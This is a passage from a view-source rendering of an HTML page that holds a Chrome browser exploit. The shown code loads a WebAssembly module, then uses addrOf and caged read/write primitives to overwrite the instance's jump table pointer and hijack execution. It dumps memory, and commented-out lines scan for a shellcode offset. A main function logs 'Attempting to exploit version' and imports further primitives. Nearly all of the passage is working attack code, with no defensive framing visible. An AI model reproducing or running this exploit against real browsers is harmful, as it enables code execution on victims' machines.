0xa2, 0xc0, 0x80, 0x01, 0x85, 0x42, 0xff, 0xa7, 0xaf, 0xcf, 0xc0, 0xa2, 0xc0, 0x80, 0x01, 0x85, 0x42, 0xc3, 0xd7, 0xab, 0xa8, 0x91, 0xa0, 0xc0, 0x80, 0x01, 0x85, 0x42, 0x01, 0x84, 0x0b]);</td></tr><tr><td class="line-number" value="2840"></td><td class="line-content">        let module = new WebAssembly.Module(wasmCode);</td></tr><tr><td class="line-number" value="2841"></td><td class="line-content">        let instance = new WebAssembly.Instance(module);</td></tr><tr><td class="line-number" value="2842"></td><td class="line-content">        let wasmMain = instance.exports.main;</td></tr><tr><td class="line-number" value="2843"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2844"></td><td class="line-content">        let addr_instance = addrOf(instance);</td></tr><tr><td class="line-number" value="2845"></td><td class="line-content">        let jmp_table = cagedRead(addr_instance + BigInt(offsets.instance_jmptable));</td></tr><tr><td class="line-number" value="2846"></td><td class="line-content">        await console.log("Jmp Table address:", to_hex(jmp_table));</td></tr><tr><td class="line-number" value="2847"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2848"></td><td class="line-content">        </td></tr><tr><td class="line-number" value="2849"></td><td class="line-content">        // cagedWrite(addr_instance + BigInt(offsets.instance_jmptable), jmp_table + BigInt(0x0734));</td></tr><tr><td class="line-number" value="2850"></td><td class="line-content">        cagedWrite(addr_instance + BigInt(offsets.instance_jmptable), jmp_table + BigInt(0x0b70));</td></tr><tr><td class="line-number" value="2851"></td><td class="line-content">        await console.log(`Result:`, wasmMain(iomemBacking));</td></tr><tr><td class="line-number" value="2852"></td><td class="line-content">        let data = new TextDecoder().decode(iomem.buffer);</td></tr><tr><td class="line-number" value="2853"></td><td class="line-content">        data = Array.from(data.matchAll(/[ -~]{8,}/g)).map(e =&gt; '\t' + e[0]).join('\n');</td></tr><tr><td class="line-number" value="2854"></td><td class="line-content">        await console.log(data);</td></tr><tr><td class="line-number" value="2855"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2856"></td><td class="line-content">        // wasmMain(123n);</td></tr><tr><td class="line-number" value="2857"></td><td class="line-content">        // let {memRead} = await readwrite_factory();</td></tr><tr><td class="line-number" value="2858"></td><td class="line-content">        // await console.log("WasmRwxJmp:", to_hex(memRead(jmp_table)));</td></tr><tr><td class="line-number" value="2859"></td><td class="line-content">        // for (let x = 0; true; x += 2) {</td></tr><tr><td class="line-number" value="2860"></td><td class="line-content">        //     try {</td></tr><tr><td class="line-number" value="2861"></td><td class="line-content">        //         let d = memRead(jmp_table + BigInt(x));</td></tr><tr><td class="line-number" value="2862"></td><td class="line-content">        //         // await console.log(to_hex(x, 4), to_hex(d))</td></tr><tr><td class="line-number" value="2863"></td><td class="line-content">        //         if ((d &amp; 0xffffn) == 0x9090n) {</td></tr><tr><td class="line-number" value="2864"></td><td class="line-content">        //             await console.log("Shelcode offset:", to_hex(x, 4));</td></tr><tr><td class="line-number" value="2865"></td><td class="line-content">        //             break;</td></tr><tr><td class="line-number" value="2866"></td><td class="line-content">        //         }</td></tr><tr><td class="line-number" value="2867"></td><td class="line-content">        //     }</td></tr><tr><td class="line-number" value="2868"></td><td class="line-content">        //     catch(e) {</td></tr><tr><td class="line-number" value="2869"></td><td class="line-content">        //         console.log(x, e);</td></tr><tr><td class="line-number" value="2870"></td><td class="line-content">        //         break;</td></tr><tr><td class="line-number" value="2871"></td><td class="line-content">        //     }</td></tr><tr><td class="line-number" value="2872"></td><td class="line-content">        // }</td></tr><tr><td class="line-number" value="2873"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2874"></td><td class="line-content">    catch(e) {</td></tr><tr><td class="line-number" value="2875"></td><td class="line-content">        await console.log(e, e.stack);</td></tr><tr><td class="line-number" value="2876"></td><td class="line-content">    }</td></tr><tr><td class="line-number" value="2877"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="2878"></td><td class="line-content"><br></td></tr><tr><td class="line-number" value="2879"></td><td class="line-content">async function main() {</td></tr><tr><td class="line-number" value="2880"></td><td class="line-content">    await console.log(`Attempting to exploit version`, JSON.stringify(await ChromeVersionPromise()));</td></tr><tr><td class="line-number" value="2881"></td><td class="line-content">    await import('./primitives.mjs');</td></tr><tr><td class="line-number" value="2882"></td><td class="line-content">}</td></tr><tr><td class="line-number" value="2883"></td><td class="line-content">main();</td></tr><tr><td class="line-number" value="2884"></td><td class="line-content">// console.log('Loading...');</td></tr><tr><td class="line-number" value="2885"></td><td class="line-content">    <span class="html-tag">&lt;/script&gt;</span></td></tr><tr><td class="line-number" value="2886"></td><td class="line-content">    <span class="html-comment">&lt;!-- &lt;script type="module" src="./primitives.mjs"&gt;&lt;/script&gt; --&gt;</span></td></tr><tr><td class="line-number" value="2887"></td><td class="line-content"><span class="html-tag">&lt;/body&gt;</span></td></tr><tr><td class="line-number" value="2888"></td><td class="line-content"><span class="html-tag">&lt;/html&gt;</span></td></tr><tr><td class="line-number" value="2889"></td><td class="line-content"><span class="html-end-of-file"></span></td></tr></tbody></table></body></html>
